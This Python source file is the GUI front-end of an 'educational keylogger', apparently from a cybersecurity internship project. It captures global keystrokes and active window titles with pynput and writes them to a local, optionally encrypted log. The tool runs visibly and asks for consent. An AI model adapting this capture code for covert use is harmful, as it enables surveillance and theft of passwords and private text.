"""
Educational Keylogger - GUI Application
=======================================
A desktop front-end (customtkinter) for the educational keylogger.

This GUI is deliberately NON-stealth: it shows a visible window, a live
keystroke counter, and a running preview of what is being captured. It asks
for consent before it starts and logs only to a local file - no network.

Run:
    python gui.py

It reuses the core logic from keylogger.py (LogWriter, active-window lookup),
so the capture behaviour is identical to the command-line version.

ETHICAL / LEGAL: only run on a computer you own or are authorized to test.
Recording another person's keystrokes without consent is illegal.
"""

from __future__ import annotations

import datetime as _dt
import os
import platform
import queue
import subprocess
import sys
from pathlib import Path

try:
    import customtkinter as ctk
    from tkinter import messagebox
except ImportError:
    sys.exit("This GUI needs 'customtkinter'.  Run: pip install -r requirements.txt")

try:
    from pynput import keyboard
except ImportError:
    sys.exit("The 'pynput' package is required.  Run: pip install -r requirements.txt")

# Reuse the core engine from the command-line tool.
from keylogger import LogWriter, get_active_window_title, LOG_FILE, LOG_DIR, KEY_FILE

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

GREEN = "#2e9e4f"
RED = "#d64545"
AMBER = "#e2a93c"
GREY = "#8b949e"


class KeyloggerApp(ctk.CTk):
    def __init__(self) -> None:
        super().__init__()
        self.title("Keylogger - Keystroke Monitoring Tool (Educational)")
        self.geometry("780x660")
        self.minsize(700, 600)

        self.listener: keyboard.Listener | None = None
        self.writer: LogWriter | None = None
        self.count = 0
        self.last_window: str | None = None
        self.q: "queue.Queue[tuple[str, object]]" = queue.Queue()

        self.encrypt_var = ctk.BooleanVar(value=False)
        self.window_var = ctk.BooleanVar(value=True)

        self._build_ui()
        self.after(120, self._drain)
        self.protocol("WM_DELETE_WINDOW", self._on_close)

    # ------------------------------------------------------------------ UI
    def _build_ui(self) -> None:
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(4, weight=1)

        # --- Header ---
        header = ctk.CTkFrame(self, corner_radius=0, fg_color="transparent")
        header.grid(row=0, column=0, sticky="ew", padx=20, pady=(16, 6))
        ctk.CTkLabel(header, text="🔐  Keylogger",
                     font=ctk.CTkFont(size=26, weight="bold")).pack(anchor="w")
        ctk.CTkLabel(header, text="Keystroke Monitoring Tool  •  runs VISIBLY  •  "
                                  "logs LOCALLY  •  educational use only",
                     text_color=GREY, font=ctk.CTkFont(size=12)).pack(anchor="w")

        # --- Ethics banner ---
        banner = ctk.CTkFrame(self, corner_radius=8, fg_color="#2b2410")
        banner.grid(row=1, column=0, sticky="ew", padx=20, pady=6)
        ctk.CTkLabel(banner, text="⚠  Only use on a computer you own or are authorized "
                                  "to test. No stealth, no network transmission.",
                     text_color=AMBER, font=ctk.CTkFont(size=12),
                     wraplength=720, justify="left").pack(anchor="w", padx=12, pady=8)

        # --- Controls row ---
        controls = ctk.CTkFrame(self, corner_radius=8)
        controls.grid(row=2, column=0, sticky="ew", padx=20, pady=6)
        controls.grid_columnconfigure((0, 1, 2, 3), weight=1)

        self.start_btn = ctk.CTkButton(controls, text="▶  Start Logging", height=40,
                                       fg_color=GREEN, hover_color="#26843f",
                                       command=self.start)
        self.start_btn.grid(row=0, column=0, padx=8, pady=10, sticky="ew")
        self.stop_btn = ctk.CTkButton(controls, text="■  Stop", height=40,
                                      fg_color=RED, hover_color="#b53838",
                                      state="disabled", command=self.stop)
        self.stop_btn.grid(row=0, column=1, padx=8, pady=10, sticky="ew")

        self.encrypt_sw = ctk.CTkSwitch(controls, text="Encrypt log",
                                        variable=self.encrypt_var)
        self.encrypt_sw.grid(row=0, column=2, padx=8, pady=10)
        self.window_sw = ctk.CTkSwitch(controls, text="Track active window",
                                       variable=self.window_var)
        self.window_sw.grid(row=0, column=3, padx=8, pady=10)

        # --- Status row ---
        status = ctk.CTkFrame(self, corner_radius=8)
        status.grid(row=3, column=0, sticky="ew", padx=20, pady=6)
        status.grid_columnconfigure((0, 1, 2), weight=1)
        self.status_lbl = ctk.CTkLabel(status, text="●  Idle", text_color=GREY,
                                       font=ctk.CTkFont(size=14, weight="bold"))
        self.status_lbl.grid(row=0, column=0, padx=12, pady=10, sticky="w")
        self.count_lbl = ctk.CTkLabel(status, text="Keystrokes: 0",
                                      font=ctk.CTkFont(size=14))
        self.count_lbl.grid(row=0, column=1, padx=12, pady=10)
        self.win_lbl = ctk.CTkLabel(status, text="Window: -", text_color=GREY,
                                    font=ctk.CTkFont(size=12), anchor="e")
        self.win_lbl.grid(row=0, column=2, padx=12, pady=10, sticky="e")

        # --- Live preview ---
        prev = ctk.CTkFrame(self, corner_radius=8)
        prev.grid(row=4, column=0, sticky="nsew", padx=20, pady=6)
        prev.grid_columnconfigure(0, weight=1)
        prev.grid_rowconfigure(1, weight=1)
        ctk.CTkLabel(prev, text="Live capture preview",
                     font=ctk.CTkFont(size=13, weight="bold")).grid(
            row=0, column=0, sticky="w", padx=12, pady=(10, 0))
        self.textbox = ctk.CTkTextbox(prev, font=ctk.CTkFont(family="Consolas", size=13),
                                      wrap="word")
        self.textbox.grid(row=1, column=0, sticky="nsew", padx=12, pady=10)
        self.textbox.insert("end", "Press 'Start Logging' to begin. Captured keys will "
                                   "appear here in real time.\n")

        # --- Utility buttons ---
        util = ctk.CTkFrame(self, corner_radius=8, fg_color="transparent")
        util.grid(row=5, column=0, sticky="ew", padx=20, pady=(0, 8))
        for i in range(4):
            util.grid_columnconfigure(i, weight=1)
        ctk.CTkButton(util, text="Open Log File", fg_color="#30435c",
                      hover_color="#3b5675",
                      command=lambda: self._open(LOG_FILE)).grid(
            row=0, column=0, padx=6, sticky="ew")
        ctk.CTkButton(util, text="Open Logs Folder", fg_color="#30435c",
                      hover_color="#3b5675",
                      command=lambda: self._open(LOG_DIR)).grid(
            row=0, column=1, padx=6, sticky="ew")
        ctk.CTkButton(util, text="Decrypt Log", fg_color="#30435c",
                      hover_color="#3b5675", command=self.decrypt_view).grid(
            row=0, column=2, padx=6, sticky="ew")
        ctk.CTkButton(util, text="Clear Log", fg_color="#5c3030",
                      hover_color="#753b3b", command=self.clear_log).grid(
            row=0, column=3, padx=6, sticky="ew")

        # --- Footer ---
        ctk.CTkLabel(self, text="NGS-CS26-KM23  |  NXTGENSEC Cybersecurity Internship",
                     text_color=GREY, font=ctk.CTkFont(size=11)).grid(
            row=6, column=0, pady=(0, 10))

    # ---------------------------------------------------------- keystrokes
    def _timestamp(self) -> str:
        return _dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    def _on_press(self, key) -> None:
        if self.window_var.get():
            title = get_active_window_title()
            if title != self.last_window:
                self.last_window = title
                self.writer.write(f"\n[{self._timestamp()}] --- WINDOW: {title} ---")
                self.q.put(("window", title))
        try:
            char = key.char
            if char is not None:
                self.writer.write(char)
                self.q.put(("key", char))
        except AttributeError:
            special = {keyboard.Key.space: " ", keyboard.Key.enter: "\n",
                       keyboard.Key.tab: "\t"}
            token = special.get(key, f"[{str(key).replace('Key.', '')}]")
            self.writer.write(token)
            self.q.put(("key", token))
        self.count += 1
        self.q.put(("count", self.count))

    def _drain(self) -> None:
        try:
            while True:
                kind, val = self.q.get_nowait()
                if kind == "key":
                    self.textbox.insert("end", val)
                    self.textbox.see("end")
                elif kind == "window":
                    self.textbox.insert("end", f"\n──[ {val} ]──\n")
                    self.textbox.see("end")
                    self.win_lbl.configure(text=f"Window: {str(val)[:40]}")
                elif kind == "count":
                    self.count_lbl.configure(text=f"Keystrokes: {val}")
        except queue.Empty:
            pass
        self.after(120, self._drain)

    # -------------------------------------------------------------- actions
    def start(self) -> None:
        if not messagebox.askyesno(
                "Consent required",
                "This will record the keys pressed on THIS computer to a local file.\n\n"
                "Only continue on a machine you own or are authorized to test.\n\n"
                "Start logging?"):
            return
        try:
            self.writer = LogWriter(encrypt=self.encrypt_var.get())
        except SystemExit as e:
            messagebox.showerror("Error", str(e))
            return
        self.count = 0
        self.last_window = None
        self.writer.write(f"\n===== SESSION START {self._timestamp()} =====")
        self.textbox.delete("1.0", "end")
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()

        self.status_lbl.configure(text="●  Recording", text_color=RED)
        self.count_lbl.configure(text="Keystrokes: 0")
        self.start_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")
        self.encrypt_sw.configure(state="disabled")
        self.window_sw.configure(state="disabled")

    def stop(self) -> None:
        if self.listener:
            self.listener.stop()
            self.listener = None
        if self.writer:
            self.writer.write(f"\n===== SESSION END {self._timestamp()} =====")
            enc = " (encrypted)" if self.writer.encrypt else ""
            self.textbox.insert("end", f"\n\n[stopped] {self.count} keystrokes saved to "
                                       f"{LOG_FILE.name}{enc}\n")
            self.textbox.see("end")
        self.status_lbl.configure(text="●  Idle", text_color=GREY)
        self.start_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")
        self.encrypt_sw.configure(state="normal")
        self.window_sw.configure(state="normal")

    def decrypt_view(self) -> None:
        try:
            from cryptography.fernet import Fernet, InvalidToken
        except ImportError:
            messagebox.showerror("Missing dependency", "Install 'cryptography' first.")
            return
        if not LOG_FILE.exists():
            messagebox.showinfo("No log", "No log file found yet.")
            return
        if not KEY_FILE.exists():
            messagebox.showinfo("Not encrypted",
                                "No secret.key found - the log is plaintext.\n"
                                "Use 'Open Log File' to view it.")
            return
        fernet = Fernet(KEY_FILE.read_bytes())
        lines, ok = [], 0
        for raw in LOG_FILE.read_bytes().splitlines():
            raw = raw.strip()
            if not raw:
                continue
            try:
                lines.append(fernet.decrypt(raw).decode("utf-8"))
                ok += 1
            except InvalidToken:
                lines.append("[line could not be decrypted]\n")
        if ok == 0:
            messagebox.showinfo("Nothing to decrypt",
                                "The log does not appear to be encrypted with this key.")
            return
        win = ctk.CTkToplevel(self)
        win.title("Decrypted Log")
        win.geometry("640x460")
        box = ctk.CTkTextbox(win, font=ctk.CTkFont(family="Consolas", size=13), wrap="word")
        box.pack(fill="both", expand=True, padx=12, pady=12)
        box.insert("end", "".join(lines))

    def clear_log(self) -> None:
        if self.listener:
            messagebox.showwarning("Stop first", "Stop logging before clearing the log.")
            return
        if not LOG_FILE.exists():
            return
        if messagebox.askyesno("Clear log", f"Delete the contents of {LOG_FILE.name}?"):
            LOG_FILE.write_text("", encoding="utf-8")
            self.textbox.delete("1.0", "end")
            self.textbox.insert("end", "Log cleared.\n")

    def _open(self, path: Path) -> None:
        if not path.exists():
            messagebox.showinfo("Not found", f"{path} does not exist yet.")
            return
        try:
            if platform.system() == "Windows":
                os.startfile(path)  # type: ignore[attr-defined]
            elif platform.system() == "Darwin":
                subprocess.run(["open", str(path)])
            else:
                subprocess.run(["xdg-open", str(path)])
        except Exception as e:
            messagebox.showerror("Error", str(e))

    def _on_close(self) -> None:
        if self.listener:
            self.listener.stop()
        self.destroy()


def main() -> None:
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    app = KeyloggerApp()
    app.mainloop()


if __name__ == "__main__":
    main()
